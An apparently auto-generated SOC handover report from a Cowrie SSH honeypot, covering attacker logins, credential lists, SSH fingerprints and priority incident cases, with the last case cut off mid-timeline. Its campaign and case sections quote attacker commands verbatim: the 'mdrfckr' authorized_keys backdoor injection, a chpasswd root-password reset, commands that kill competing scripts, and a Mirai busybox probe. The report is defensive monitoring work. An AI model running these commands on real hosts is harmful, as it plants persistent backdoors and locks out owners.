# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-06 |
| **Generated At** | 2026-05-06T17:45:31Z |
| **Shift Time** | 17:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **431** |
| Confirmed Threats | **352** |
| False Positives Filtered | **79** (18.3%) |
| Unique Attacker IPs | **57** |
| Countries of Origin | **26** |
| High Severity Cases | **81** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **350** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **216** |
| Unique Credential Pairs | **82** |
| Unique Usernames | **37** |
| Unique Passwords | **78** |
| Successful Auth Pairs | **52** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 83 |
| `345gs5662d34` | 36 |
| `ubuntu` | 13 |
| `admin` | 10 |
| `ftpuser` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 36 |
| `3245gs5662d34` | 36 |
| `123456789` | 6 |
| `` | 5 |
| `Password` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 36 |
| `root` | `3245gs5662d34` | 36 |
| `root` | `server!@#123` | 4 |
| `root` | `` | 4 |
| `ubuntu` | `123012` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `---fuck_you----` | `92.205.235.35` | 2026-05-06T15:10:27 |
| `root` | `server!@#123` | `154.83.196.237` | 2026-05-06T15:28:40 |
| `root` | `3245gs5662d34` | `154.83.196.237` | 2026-05-06T15:28:44 |
| `root` | `` | `192.42.116.112` | 2026-05-06T15:34:48 |
| `root` | `test12345` | `182.217.16.126` | 2026-05-06T15:38:00 |
| `root` | `3245gs5662d34` | `182.217.16.126` | 2026-05-06T15:38:04 |
| `root` | `admin123!@#` | `182.217.16.126` | 2026-05-06T15:38:59 |
| `root` | `Li147258` | `103.39.225.73` | 2026-05-06T15:41:36 |
| `root` | `#EDC2wsx1qaz` | `103.39.225.73` | 2026-05-06T15:44:05 |
| `root` | `server2024#` | `103.39.225.73` | 2026-05-06T15:50:23 |
| `root` | `myadmin` | `182.217.16.126` | 2026-05-06T15:54:48 |
| `root` | `server!@#123` | `182.217.16.126` | 2026-05-06T15:56:45 |
| `root` | `myadmin` | `43.227.185.238` | 2026-05-06T16:03:23 |
| `root` | `3245gs5662d34` | `43.227.185.238` | 2026-05-06T16:03:25 |
| `root` | `admin123!@#` | `43.227.185.238` | 2026-05-06T16:09:45 |
| `root` | `test12345` | `43.227.185.238` | 2026-05-06T16:10:49 |
| `root` | `server!@#123` | `43.227.185.238` | 2026-05-06T16:12:50 |
| `root` | `1234qwer,./` | `220.154.131.135` | 2026-05-06T16:17:21 |
| `root` | `testtest123` | `86.139.23.230` | 2026-05-06T16:18:15 |
| `root` | `3245gs5662d34` | `86.139.23.230` | 2026-05-06T16:18:20 |
| `root` | `root@54321` | `86.139.23.230` | 2026-05-06T16:19:00 |
| `root` | `2025@Admin` | `86.139.23.230` | 2026-05-06T16:19:47 |
| `root` | `P@ssw0rd...` | `86.139.23.230` | 2026-05-06T16:20:33 |
| `root` | `Pa$$w0rd@2024` | `86.139.23.230` | 2026-05-06T16:21:21 |
| `root` | `1Qaz2Wsx!@#` | `86.139.23.230` | 2026-05-06T16:22:10 |
| `root` | `14789630` | `86.139.23.230` | 2026-05-06T16:23:48 |
| `root` | `jj1314520` | `86.139.23.230` | 2026-05-06T16:24:35 |
| `root` | `qazwsx11` | `86.139.23.230` | 2026-05-06T16:25:21 |
| `root` | `Cq@123456` | `86.139.23.230` | 2026-05-06T16:26:08 |
| `root` | `881104` | `86.139.23.230` | 2026-05-06T16:26:55 |
| `root` | `adm12345` | `86.139.23.230` | 2026-05-06T16:27:44 |
| `root` | `Sa147258` | `86.139.23.230` | 2026-05-06T16:28:33 |
| `root` | `h0j9k8l7ZAQ!` | `86.139.23.230` | 2026-05-06T16:29:23 |
| `root` | `rootROOT` | `86.139.23.230` | 2026-05-06T16:31:45 |
| `root` | `ali123456` | `86.139.23.230` | 2026-05-06T16:32:32 |
| `root` | `123456Qaz` | `86.139.23.230` | 2026-05-06T16:33:19 |
| `root` | `Password0` | `86.139.23.230` | 2026-05-06T16:34:06 |
| `root` | `!1qaz2wsx` | `86.139.23.230` | 2026-05-06T16:35:00 |
| `root` | `Password2026` | `86.139.23.230` | 2026-05-06T16:35:49 |
| `root` | `ABcd123456` | `86.139.23.230` | 2026-05-06T16:36:37 |
| `root` | `` | `192.42.116.100` | 2026-05-06T16:38:02 |
| `root` | `Qwerty1234` | `86.139.23.230` | 2026-05-06T16:38:11 |
| `root` | `admin123!@#` | `172.173.117.246` | 2026-05-06T16:44:24 |
| `root` | `3245gs5662d34` | `172.173.117.246` | 2026-05-06T16:44:29 |
| `root` | `server!@#123` | `172.173.117.246` | 2026-05-06T16:45:22 |
| `root` | `test12345` | `172.173.117.246` | 2026-05-06T16:50:15 |
| `root` | `myadmin` | `172.173.117.246` | 2026-05-06T17:03:45 |
| `root` | `Zaqwsx123` | `125.16.27.190` | 2026-05-06T17:05:36 |
| `root` | `3245gs5662d34` | `125.16.27.190` | 2026-05-06T17:05:38 |
| `root` | `k` | `51.77.158.34` | 2026-05-06T17:25:08 |
| `root` | `3245gs5662d34` | `51.77.158.34` | 2026-05-06T17:25:12 |
| `root` | `vizxv` | `37.57.33.51` | 2026-05-06T17:36:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **431** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 264 |
| Go SSH scanner | 5 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 230 | 8 |
| `03a80b21afa8...` | Modern SSH client | 26 | 2 |
| `97281db8c1a6...` | Modern SSH client | 3 | 1 |
| `087ab61de4f8...` | Mirai/variant | 2 | 2 |
| `04f9d9fca3a9...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 230 | 8 | libssh-based |
| `03a80b21afa8...` | libssh | 26 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `97281db8c1a6...` | libssh | 3 | 1 | Modern SSH client |
| `087ab61de4f8...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `04f9d9fca3a9...` | libssh | 1 | 1 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1592, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 36 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
cat /proc/mounts; /bin/busybox DSLAO
```
Source IPs: `37.57.33.51`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:uvbxUFURaaoT"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `220.154.131.135`, `103.39.225.73`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `86.139.23.230`, `43.227.185.238`, `125.16.27.190`, `154.83.196.237`, `51.77.158.34`, `172.173.117.246`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **57** |
| Unique ASNs | **46** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | MEDIUM |
| `AS215125` | Church of Cyberology | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS6057` | Administracion Nacional de Telecomunicaciones | 2 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (81)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9cd4f2862c51

| Field | Detail |
|---|---|
| **Source IP** | `92.205.235[.]35` |
| **First Seen** | 2026-05-06 15:10 |
| **Last Seen** | 2026-05-06 15:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:10:24` | `cowrie.session.connect` |
| `2026-05-06 15:10:25` | `cowrie.client.version` |
| `2026-05-06 15:10:25` | `cowrie.client.kex` |
| `2026-05-06 15:10:27` | `cowrie.login.success` |
| `2026-05-06 15:10:29` | `cowrie.session.params` |
| `2026-05-06 15:10:29` | `cowrie.command.input` |
| `2026-05-06 15:10:29` | `cowrie.log.closed` |
| `2026-05-06 15:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.235[.]35` to AbuseIPDB if not already reported
- [ ] Block `92.205.235[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35cd5d472f2

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-05-06 15:28 |
| **Last Seen** | 2026-05-06 15:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:28:39` | `cowrie.session.connect` |
| `2026-05-06 15:28:39` | `cowrie.client.version` |
| `2026-05-06 15:28:39` | `cowrie.client.kex` |
| `2026-05-06 15:28:40` | `cowrie.login.success` |
| `2026-05-06 15:28:40` | `cowrie.session.params` |
| `2026-05-06 15:28:40` | `cowrie.command.input` |
| `2026-05-06 15:28:40` | `cowrie.command.failed` |
| `2026-05-06 15:28:41` | `cowrie.log.closed` |
| `2026-05-06 15:28:41` | `cowrie.session.params` |
| `2026-05-06 15:28:41` | `cowrie.command.input` |
| `2026-05-06 15:28:41` | `cowrie.session.file_download` |
| `2026-05-06 15:28:41` | `cowrie.log.closed` |
| `2026-05-06 15:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4e4ea6a173

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-05-06 15:28 |
| **Last Seen** | 2026-05-06 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:28:44` | `cowrie.session.connect` |
| `2026-05-06 15:28:44` | `cowrie.client.version` |
| `2026-05-06 15:28:44` | `cowrie.client.kex` |
| `2026-05-06 15:28:44` | `cowrie.login.success` |
| `2026-05-06 15:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64e07a95d3a

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]112` |
| **First Seen** | 2026-05-06 15:34 |
| **Last Seen** | 2026-05-06 15:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778081691121650394" | sh, bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778081691121650394
` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:34:45` | `cowrie.session.connect` |
| `2026-05-06 15:34:46` | `cowrie.client.version` |
| `2026-05-06 15:34:46` | `cowrie.client.kex` |
| `2026-05-06 15:34:48` | `cowrie.login.success` |
| `2026-05-06 15:34:49` | `cowrie.client.size` |
| `2026-05-06 15:34:50` | `cowrie.session.params` |
| `2026-05-06 15:34:51` | `cowrie.command.input` |
| `2026-05-06 15:34:51` | `cowrie.command.input` |
| `2026-05-06 15:34:51` | `cowrie.command.input` |
| `2026-05-06 15:34:56` | `cowrie.log.closed` |
| `2026-05-06 15:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]112` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db992199af31

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:37 |
| **Last Seen** | 2026-05-06 15:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:37:59` | `cowrie.session.connect` |
| `2026-05-06 15:37:59` | `cowrie.client.version` |
| `2026-05-06 15:38:00` | `cowrie.client.kex` |
| `2026-05-06 15:38:00` | `cowrie.login.success` |
| `2026-05-06 15:38:00` | `cowrie.session.params` |
| `2026-05-06 15:38:00` | `cowrie.command.input` |
| `2026-05-06 15:38:00` | `cowrie.command.failed` |
| `2026-05-06 15:38:00` | `cowrie.log.closed` |
| `2026-05-06 15:38:01` | `cowrie.session.params` |
| `2026-05-06 15:38:01` | `cowrie.command.input` |
| `2026-05-06 15:38:01` | `cowrie.session.file_download` |
| `2026-05-06 15:38:01` | `cowrie.log.closed` |
| `2026-05-06 15:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8fd444588ef

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:38 |
| **Last Seen** | 2026-05-06 15:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:38:03` | `cowrie.session.connect` |
| `2026-05-06 15:38:03` | `cowrie.client.version` |
| `2026-05-06 15:38:03` | `cowrie.client.kex` |
| `2026-05-06 15:38:04` | `cowrie.login.success` |
| `2026-05-06 15:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05e7c569fee9

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:38 |
| **Last Seen** | 2026-05-06 15:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:38:59` | `cowrie.session.connect` |
| `2026-05-06 15:38:59` | `cowrie.client.version` |
| `2026-05-06 15:38:59` | `cowrie.client.kex` |
| `2026-05-06 15:38:59` | `cowrie.login.success` |
| `2026-05-06 15:39:00` | `cowrie.session.params` |
| `2026-05-06 15:39:00` | `cowrie.command.input` |
| `2026-05-06 15:39:00` | `cowrie.command.failed` |
| `2026-05-06 15:39:00` | `cowrie.log.closed` |
| `2026-05-06 15:39:00` | `cowrie.session.params` |
| `2026-05-06 15:39:00` | `cowrie.command.input` |
| `2026-05-06 15:39:00` | `cowrie.session.file_download` |
| `2026-05-06 15:39:00` | `cowrie.log.closed` |
| `2026-05-06 15:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4d4a05ab933

| Field | Detail |
|---|---|
| **Source IP** | `182.217.16[.]126` |
| **First Seen** | 2026-05-06 15:39 |
| **Last Seen** | 2026-05-06 15:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:39:02` | `cowrie.session.connect` |
| `2026-05-06 15:39:02` | `cowrie.client.version` |
| `2026-05-06 15:39:03` | `cowrie.client.kex` |
| `2026-05-06 15:39:03` | `cowrie.login.success` |
| `2026-05-06 15:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.217.16[.]126` to AbuseIPDB if not already reported
- [ ] Block `182.217.16[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ee813b9d8a

| Field | Detail |
|---|---|
| **Source IP** | `103.39.225[.]73` |
| **First Seen** | 2026-05-06 15:41 |
| **Last Seen** | 2026-05-06 15:41 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:uvbxUFURaaoT"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 15:41:35` | `cowrie.session.connect` |
| `2026-05-06 15:41:35` | `cowrie.client.version` |
| `2026-05-06 15:41:36` | `cowrie.client.kex` |
| `2026-05-06 15:41:36` | `cowrie.login.success` |
| `2026-05-06 15:41:36` | `cowrie.session.params` |
| `2026-05-06 15:41:36` | `cowrie.command.input` |
| `2026-05-06 15:41:36` | `cowrie.command.failed` |
| `2026-05-06 15:41:36` | `cowrie.log.closed` |
| `2026-05-06 15:41:37` | `cowrie.session.params` |
| `2026-05-06 15:41:37` | `cowrie.command.input` |
| `2026-05-06 15:41:37` | `cowrie.session.file_download` |
| `2026-05-06 15:41:37` | `cowrie.log.closed` |
| `2026-05-06 15:41:50` | `cowrie.session.params` |
| `2026-05-06 15:41:50` | `cowrie.command.input` |
| `2026-05-06 15:41:50` | `cowrie.log.closed` |
| `2026-05-06 15:41:51` | `cowrie.session.params` |
| `2026-05-06 15:41:51` | `cowrie.command.input` |
| `2026-05-06 15:41:51` | `cowrie.log.closed` |
| `2026-05-06 15:41:51` | `cowrie.session.params` |
| `2026-05-06 15:41:51` | `cowrie.command.input` |
| `2026-05-06 15:41:51` | `cowrie.session.file_download` |
| `2026-05-06 15:41:51` | `cowrie.log.closed` |
| `2026-05-06 15:41:52` | `cowrie.session.params` |
| `2026-05-06 15:41:52` | `cowrie.command.input` |
| `2026-05-06 15:41:52` | `cowrie.log.closed` |
| `2026-05-06 15:41:52` | `cowrie.session.params` |
| `2026-05-06 15:41:52` | `cowrie.command.input` |
| `2026-05-06 15:41:52` | `cowrie.log.closed` |
| `2026-05-06 15:41:52` | `cowrie.session.params` |
| `2026-05-06 15:41:52` | `cowrie.command.input` |
| `2026-05-06 15:41:52` | `cowrie.command.input` |
| `2026-05-06 15:41:52` | `cowrie.log.closed` |
| `2026-05-06 15:41:53` | `cowrie.session.params` |
| `2026-05-06 15:41:53` | `cowrie.command.input` |
| `2026-05-06 15:41:53` | `cowrie.log.closed` |
| `2026-05-06 15:41:53` | `cowrie.session.params` |
| `2026-05-06 15:41:53` | `cowrie.command.input` |
| `2026-05-06 15:41:53` | `cowrie.log.closed` |
| `2026-05-06 15:41:54` | `cowrie.session.params` |
| `2026-05-06 15:41:54` | `cowrie.command.input` |
| `2026-05-06 15:41:54` | `cowrie.log.closed` |
| `2026-05-06 15:41:54` | `cowrie.session.params` |
| `2026-05-06 15:41:54` | `cowrie.command.input` |
| `2026-05-06 15:41:54` | `cowrie.log.closed` |
| `2026-05-06 15:41:54` | `cowrie.session.params` |
| `2026-05-06 15:41:54` | `cowrie.command.input` |
| `2026-05-06 15:41:54` | `cowrie.log.closed` |
| `2026-05-06 15:41:55` | `cowrie.session.params` |
| `2026-05-06 15:41:55` | `cowrie.command.input` |
| `2026-05-06 15:41:55` | `cowrie.log.closed` |
| `2026-05-06 15:41:55` | `cowrie.session.params` |
